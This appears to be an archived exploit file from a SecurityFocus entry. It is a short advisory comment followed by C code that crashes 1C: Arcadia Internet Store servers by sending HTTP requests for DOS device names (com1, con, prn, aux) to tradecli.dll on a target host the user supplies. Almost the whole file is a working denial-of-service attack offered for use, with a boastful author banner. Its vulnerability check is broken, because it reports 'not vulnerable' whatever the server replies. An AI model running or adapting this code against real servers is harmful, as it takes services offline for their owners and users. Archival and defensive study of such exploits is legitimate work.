// source: http://www.securityfocus.com/bid/2905/info

// 1C: Arcadia Internet Store is a online shopping utility for Microsoft Windows NT/2000 that is fully integratable with 1C: Enterprise, another popular Russian web-commerce utility.

// One of the components of this package, 'tradecli.dll', allows users to specify a template file, the contents of which will be output.

// Remote attackers can request dos devices, such as 'con', 'com1', 'com2', etc. When 'tradecli.dll' attempts to open these files a denial of service may occur. 

/*
 Proof of conecpt code by linux^sex
 Exploit provided by NERF Security gr0up
 Attempts to crash any server you specify
 running Arcadia 1C: Arcadia Internet Store 1.0
 on Windows NT/2000 fully integratable with 
 1C: Enterprise, another popular Russian 
 web-commerce utility. 

 code request dos devices, such as 'con', 'com1', 'com2', etc. 
 When 'tradecli.dll' attempts to open these files a denial of 
 service may occur. Vendor has not released any patches as of yet
 NOTE: I take no responsibility for the mis-use of this code
*/
 



#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define PORT 80
char death[]= {
  "GET /scripts/tradecli.dll?template=com1 HTML/1.0\n\n\n"
  "GET /scripts/tradecli.dll?template=com2 HTML/1.0\n\n\n"
  "GET /scripts/tradecli.dll?template=com3 HTML/1.0\n\n\n"
  "GET /scripts/tradecli.dll?template=con HTML/1.0\n\n\n"
  "GET /scripts/tradecli.dll?template=prn HTML/1.0\n\n\n"
  "GET /scripts/tradecli.dll?template=aux HTML/1.0\n\n\n"
};

int main(int argc, char *argv[]) {
  int sockfd;
  char buf[1024];
  struct hostent *ha;
  struct sockaddr_in sa;
  if (argv[1] == NULL) {
    printf("Usage: %s <HOST>\n", argv[0]);
    printf("Proof of concecpt code by linux^sex\n");
    printf("contact me at linuxsex@crackdealer.com\n");
    printf("props to r00t-access crew\n");
    printf("visit us at www.r00taccess.ath.cx\n");
    exit(0);
  }

  if (!(ha = gethostbyname (argv[1])))
    perror ("gethostbyname");

  bzero (&sa, sizeof (sa));
  bcopy (ha->h_addr, (char *) &sa.sin_addr, ha->h_length);
  sa.sin_family = ha->h_addrtype;
  sa.sin_port = htons (PORT);
    
  if ((sockfd = socket (ha->h_addrtype, SOCK_STREAM, 0)) < 0) {
    perror ("socket");
    exit (1);
  }
  printf("Connecting\n");
  if (connect (sockfd, (struct sockaddr *) &sa, sizeof(sa)) < 0) {
    perror ("connect");
    exit (1);
  }
  printf("Connected...\nrequesting dos devices\n");
  send(sockfd, death, sizeof(death), 0);
  read(sockfd, buf, 1024, 0);
  if (buf != NULL) {
    printf("Host is not vulnerable\n");
    close(sockfd);
  }
}